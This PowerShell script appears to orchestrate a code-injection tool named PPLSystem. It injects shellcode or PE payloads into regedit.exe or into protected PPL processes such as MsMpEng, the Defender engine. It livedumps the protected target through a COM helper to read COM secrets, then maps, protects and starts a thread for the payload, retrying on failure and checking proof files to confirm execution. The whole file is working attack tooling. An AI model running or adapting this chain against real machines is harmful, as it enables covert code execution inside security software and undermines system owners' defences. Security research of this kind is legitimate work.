<#
.SYNOPSIS
    Drive the PPLSystem injection chain end to end.

.DESCRIPTION
    Two modes:

      regedit (default) - inject into a normal, non-protected COM process
        (regedit.exe). The COM secret/context are read directly from the target
        by the Rust tools; no dump, no cdb, no Python required. This is the
        stable demonstration path.

      ppl (advanced) - inject into a PPL process (e.g. MsMpEng). Requires the
        SentinelHelper COM component to livedump the target; the COM
        secret/context are then read natively from the dump (no debugger).

    For both modes pplsystem.exe maps the image and PRINTS the mapped base, which
    is handed to shellcode.exe to protect + execute it - no second dump needed.

.EXAMPLE
    ./orchestrate.ps1 -Mode regedit
    ./orchestrate.ps1 -Mode regedit -TargetPid 1234
    ./orchestrate.ps1 -Mode ppl -ProcessName MsMpEng
#>
[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [ValidateSet('regedit', 'test', 'ppl')] [string]$Mode = 'regedit',
    # 2nd positional = the ppl target process name, so `-Mode ppl MsMpEng` works.
    [Parameter(Position = 1)]
    [string]$ProcessName = 'MsMpEng',
    [string]$ShellcodePath,
    [ValidatePattern('^\d+$')] [string]$TargetPid,
    [int]$MaxRetries = 3,
    [switch]$KeepProofFile,
    [switch]$Inspect
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$root = $PSScriptRoot
Import-Module (Join-Path $root 'scripts\Common.psm1') -Force

$ProofFiles = @(
    'C:\Users\Public\inject_proof.txt',
    'C:\Windows\Temp\inject_proof.txt',
    'C:\ProgramData\inject_proof.txt'
)

# ---------------------------------------------------------------------------
function Invoke-Capture {
    param([Parameter(Mandatory)] [string]$Exe, [string[]]$Arguments = @())
    Write-Host "[*] $Exe $($Arguments -join ' ')" -ForegroundColor DarkGray
    # Native stderr must NOT be promoted to a terminating PS error (it would mask
    # the tool's real output). Capture everything and rely on $LASTEXITCODE.
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        # Stream each line to the host as it arrives (so a long run does not look
        # hung) while still capturing everything for the caller.
        $out = (& $Exe @Arguments 2>&1 | ForEach-Object { Write-Host $_; $_ } | Out-String)
    } finally {
        $ErrorActionPreference = $prev
    }
    $script:LastExit = $LASTEXITCODE
    return $out
}

function Get-MappedBase {
    param([Parameter(Mandatory)] [string]$Text)
    if ($Text -match 'mapped-base:\s*(0x[0-9A-Fa-f]+)') { return $Matches[1] }
    throw "Could not parse 'mapped-base' from pplsystem.exe output."
}

function Get-StageFailureSummary {
    param([Parameter(Mandatory)] [string]$Text)
    if ($Text -match 'remote image validation failed at (0x[0-9A-Fa-f]+):\s*readback returned HRESULT\((0x[0-9A-Fa-f]+)\)') {
        return "remote image validation failed at $($Matches[1]) (readback HRESULT($($Matches[2])))"
    }
    $lines = $Text -split "`r?`n" | Where-Object { $_.Trim().Length -gt 0 }
    $errorLine = $lines | Where-Object { $_ -like 'Error:*' } | Select-Object -Last 1
    if ($errorLine) { return ($errorLine -replace '^Error:\s*', '') }
    if ($lines.Count -gt 0) { return $lines[-1] }
    return '<no output>'
}

function Resolve-RegeditPid {
    param([string]$ExplicitPid)
    if ($ExplicitPid) {
        if (-not (Get-Process -Id ([int]$ExplicitPid) -ErrorAction SilentlyContinue)) {
            throw "No process with PID $ExplicitPid is running."
        }
        return [int]$ExplicitPid
    }
    $proc = Get-Process -Name regedit -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $proc) {
        Write-Host '[*] regedit.exe is not running - launching it...'
        Start-Process regedit | Out-Null
        Start-Sleep -Seconds 2   # let it initialise COM (OleInitialize)
        $proc = Get-Process -Name regedit -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) { throw 'Failed to launch regedit.exe.' }
    }
    return $proc.Id
}

# --- PPL mode helper (SentinelHelper livedump) -----------------------------
function Get-HelperComObject {
    $code = @"
using System;
using System.Runtime.InteropServices;
public class ImpTest {
    [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
    public static extern int CoSetProxyBlanket(IntPtr pProxy, uint dwAuthnSvc, uint dwAuthzSvc,
        uint pServerPrincName, uint dwAuthLevel, uint dwImpLevel, IntPtr pAuthInfo, uint dwCapabilities);
    public static int SetSecurity(object objDCOM) {
        IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
        return CoSetProxyBlanket(dispatchInterface, 0xffffffff, 0xffffffff, 0xffffffff, 0, 3, IntPtr.Zero, 64);
    }
}
"@
    Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue | Out-Null
    $helper = New-Object -ComObject 'SentinelHelper.1'
    [ImpTest]::SetSecurity($helper) | Out-Null
    return $helper
}

function Invoke-PplDump {
    # Livedump the PPL target via the SentinelHelper COM object and return the
    # path to the full-memory user dump. The Rust tools read the COM
    # secret/context straight out of this dump (native parser - no debugger).
    param(
        [Parameter(Mandatory)] [int]$ProcId,
        [Parameter(Mandatory)] [string]$RunDir
    )
    $userDump = Join-Path $RunDir 'user.dmp'
    $kernelDump = Join-Path $RunDir 'kernel.dmp'

    Write-Host "[*] Livedumping PID $ProcId via SentinelHelper (may briefly freeze the machine)..."
    $helper = Get-HelperComObject
    if (-not $helper) { throw 'Failed to initialise the SentinelHelper COM object.' }
    $helper.dump($ProcId, $userDump, $kernelDump)
    if (-not (Wait-ForFile -Path $userDump -TimeoutSec 120)) { throw "User dump '$userDump' was not produced." }
    return $userDump
}

# Detect a pe2shc-converted payload: it writes a redirect at the very start of
# the image - "MZ" (4D 5A) then 45 52 E8 (push r10; call $+5) - whereas a normal
# MSVC PE begins 4D 5A 90 00. Such a payload must be started at the image base
# (offset 0), not AddressOfEntryPoint.
function Test-IsPe2shcPayload {
    param([Parameter(Mandatory)] [string]$Path)
    try {
        $b = [System.IO.File]::ReadAllBytes($Path)
        return ($b.Length -ge 5 -and $b[0] -eq 0x4D -and $b[1] -eq 0x5A -and
                $b[2] -eq 0x45 -and $b[3] -eq 0x52 -and $b[4] -eq 0xE8)
    } catch { return $false }
}

# ---------------------------------------------------------------------------
function Invoke-InjectionOnce {
    param([Parameter(Mandatory)] [hashtable]$Ctx)

    $ppl = Join-Path $root 'pplsystem.exe'

    # One process does map + protect-first-page + create-thread (--execute). Doing
    # it all in a single warmed-up COM session is reliable; splitting protect/exec
    # into a second cold process (shellcode.exe) intermittently no-ops NtProtect.
    $mapArgs = @('--target', $Ctx.Mode, '--pid', $Ctx.Pid, '--shellcode', $Ctx.Shellcode, '--execute')
    if ($Ctx.Mode -eq 'ppl') { $mapArgs += @('--dump', $Ctx.Dump) }
    if ($Ctx.FromBase) { $mapArgs += '--from-base' }

    $startDesc = if ($Ctx.FromBase) { 'image base (pe2shc redirect)' } else { 'entry point' }
    Write-Host "`n--- Map + protect + execute at $startDesc (PID $($Ctx.Pid)) ---" -ForegroundColor Cyan
    $mapOut = Invoke-Capture -Exe $ppl -Arguments $mapArgs
    if ($script:LastExit -ne 0) {
        throw "pplsystem.exe failed (exit $script:LastExit): $(Get-StageFailureSummary -Text $mapOut)"
    }
    if ($mapOut -match 'mapped-base:\s*(0x[0-9A-Fa-f]+)') { Write-Host "[+] Mapped base: $($Matches[1])" }
}

# ===========================================================================
Write-Host "=== PPLSystem orchestrator ($Mode mode) ===" -ForegroundColor Cyan
Assert-Administrator

# Best-effort: remove section-backing temp files leaked by previous runs. The
# CURRENT run's file stays locked by its image section until the target exits, so
# only already-unlocked leftovers are removed here.
Get-ChildItem -Path $env:TEMP -Filter 'pplsystem_shellcode_*.bin' -ErrorAction SilentlyContinue |
    ForEach-Object { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue }

if (-not $ShellcodePath) { $ShellcodePath = Join-Path $root 'target.exe' }
if (-not (Test-Path -LiteralPath $ShellcodePath)) {
    throw "Shellcode/payload '$ShellcodePath' not found. Run ./build.ps1 first."
}
$ShellcodePath = (Resolve-Path -LiteralPath $ShellcodePath).Path

foreach ($exe in @('pplsystem.exe', 'shellcode.exe')) {
    if (-not (Test-Path -LiteralPath (Join-Path $root $exe))) {
        throw "$exe not found at repo root. Run ./build.ps1 first."
    }
}

$fromBase = Test-IsPe2shcPayload -Path $ShellcodePath
if ($fromBase) {
    Write-Host '[+] Payload is pe2shc shellcode -> thread will start at the image base (offset 0).'
} else {
    Write-Host '[+] Payload is a PIC PE -> thread will start at AddressOfEntryPoint.'
}
$ctx = @{ Mode = $Mode; Shellcode = $ShellcodePath; FromBase = $fromBase }

if ($Mode -eq 'regedit') {
    $ctx.Pid = Resolve-RegeditPid -ExplicitPid $TargetPid
    Write-Host "[+] Target regedit.exe PID: $($ctx.Pid)"
}
elseif ($Mode -eq 'test') {
    # Benign, CFG-enabled MTA process. Non-PPL, so the binaries use the live
    # (regedit-style) secret/context read. Safe to crash while developing.
    $exe = Join-Path $root 'test-target.exe'
    if (-not (Test-Path -LiteralPath $exe)) { throw "test-target.exe not found. Run ./build.ps1 first." }
    Write-Host '[*] Launching benign MTA test target...'
    $proc = Start-Process -FilePath $exe -PassThru -WindowStyle Minimized
    Start-Sleep -Seconds 2
    if ($proc.HasExited) { throw "test-target.exe exited immediately (PID $($proc.Id))." }
    $ctx.Pid = $proc.Id
    $ctx.Mode = 'regedit'             # binaries: live (non-PPL) secret/context path
    Write-Host "[+] Test target PID: $($ctx.Pid) (CFG-enabled MTA)"
}
else {
    $runDir = New-RunDir
    if ($TargetPid) {
        $ctx.Pid = [int]$TargetPid
    } else {
        $proc = Get-Process -Name $ProcessName -ErrorAction Stop | Select-Object -First 1
        $ctx.Pid = $proc.Id
    }
    Write-Host "[+] Target $ProcessName PID: $($ctx.Pid)"
    $ctx.Dump = Invoke-PplDump -ProcId $ctx.Pid -RunDir $runDir
    Write-Host "[+] Dump: $($ctx.Dump)"
}

# --- Inspect mode: do Stage 1 (map) only, then pause so you can attach a -------
# --- debugger and inspect the persisted mapping (no thread => no crash). ------
if ($Inspect) {
    $cdb = Get-ChildItem "$env:ProgramFiles\WindowsApps\Microsoft.WinDbg_*\amd64\cdb.exe" -ErrorAction SilentlyContinue |
           Sort-Object FullName -Descending | Select-Object -First 1

    $ppl = Join-Path $root 'pplsystem.exe'
    $mapArgs = @('--target', $ctx.Mode, '--pid', $ctx.Pid, '--shellcode', $ctx.Shellcode)
    if ($ctx.Mode -eq 'ppl') { $mapArgs += @('--dump', $ctx.Dump) }
    Write-Host "`n--- INSPECT: Stage 1 only (map, no thread) into PID $($ctx.Pid) ---" -ForegroundColor Cyan
    $mapOut = Invoke-Capture -Exe $ppl -Arguments $mapArgs
    $base = if ($mapOut -match 'mapped-base:\s*(0x[0-9A-Fa-f]+)') { $Matches[1] } else { '<unparsed>' }

    Write-Host ''
    Write-Host '=== INSPECT: target left running; the mapping persists ===' -ForegroundColor Cyan
    Write-Host "[+] Target PID: $($ctx.Pid)   reported mapped base: $base" -ForegroundColor Yellow
    Write-Host '[*] In ANOTHER elevated terminal, attach and inspect:'
    if ($cdb) { Write-Host "      & '$($cdb.FullName)' -p $($ctx.Pid)" }
    else { Write-Host "      cdb -p $($ctx.Pid)" }
    Write-Host '    then, at the cdb prompt:'
    Write-Host "      !address $base          ; state (MEM_COMMIT/RESERVE/FREE), protect, type"
    Write-Host "      db $base L20            ; first bytes - 'MZ' (4D 5A) if our image is there"
    Write-Host '      lm                      ; is there a shellcode_temp / unnamed image?'
    Write-Host "      !vprot $base"
    Write-Host '      qd                      ; detach and leave the target running'
    Write-Host ''
    Read-Host '    Press Enter here when done (kills the test target)'
    if ($Mode -eq 'test') {
        Get-Process -Id $ctx.Pid -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    return
}

# Remove any stale proof files so we can confirm THIS run succeeded.
$ProofFiles | ForEach-Object { Remove-Item -LiteralPath $_ -ErrorAction SilentlyContinue }

$attempt = 0
$succeeded = $false
$nonRetryableFailure = $false
while ($attempt -lt $MaxRetries -and -not $succeeded) {
    $attempt++
    Write-Host "`n##### Injection attempt $attempt/$MaxRetries #####" -ForegroundColor Yellow
    try {
        Invoke-InjectionOnce -Ctx $ctx
        $succeeded = $true
    } catch {
        Write-Warning "Attempt $attempt failed: $($_.Exception.Message)"
        if ($_.Exception.Message -match 'remote image validation failed|refusing to create a remote thread') {
            $nonRetryableFailure = $true
            Write-Warning 'Stage 2 proved the mapped base is not a readable PE image; retrying the same target can leave its COM state degraded, so this run is stopping here.'
            break
        }
        if ($attempt -lt $MaxRetries) { Start-Sleep -Seconds 2 }
    }
}

if (-not $succeeded) {
    if ($Mode -eq 'test') {
        Get-Process -Id $ctx.Pid -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    if ($nonRetryableFailure) {
        Write-Warning "Injection stopped after a non-retryable stage-2 validation failure. The mapped base did not contain a valid PE image."
        $global:LASTEXITCODE = 1
        return
    }
    throw "Injection failed after $MaxRetries attempt(s)."
}

Write-Host "`n[*] Waiting for the in-target proof marker..."
Start-Sleep -Seconds 2

# Did any location get the marker?
$found = $null
foreach ($pf in $ProofFiles) {
    if (Test-Path -LiteralPath $pf) { $found = $pf; break }
}

# Is the target still alive? A crash means the stage-2 thread faulted on start.
$alive = Get-Process -Id $ctx.Pid -ErrorAction SilentlyContinue

if ($found) {
    $proof = (Get-Content -LiteralPath $found -Raw).Trim()
    Write-Host "[+] SUCCESS - payload executed inside the target." -ForegroundColor Green
    Write-Host "[+] $found => $proof"
    if (-not $KeepProofFile) {
        $ProofFiles | ForEach-Object { Remove-Item -LiteralPath $_ -ErrorAction SilentlyContinue }
    }
}
elseif (-not $alive) {
    Write-Warning ("DIAGNOSIS: target PID $($ctx.Pid) is NO LONGER RUNNING - the payload thread " +
        "faulted on start and crashed the process. Check the stage-2 validation output above; if " +
        "image validation failed, the reported mapped base did not contain a valid PE image.")
}
else {
    Write-Warning ("DIAGNOSIS: target PID $($ctx.Pid) is STILL ALIVE but no proof marker appeared in " +
        "any of: $($ProofFiles -join ', '). The thread ran but could not write (restricted token), or " +
        "did not execute the payload. Not a crash/CFG case.")
}

# Clean up the benign test target if it's still running.
if ($Mode -eq 'test') {
    Get-Process -Id $ctx.Pid -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
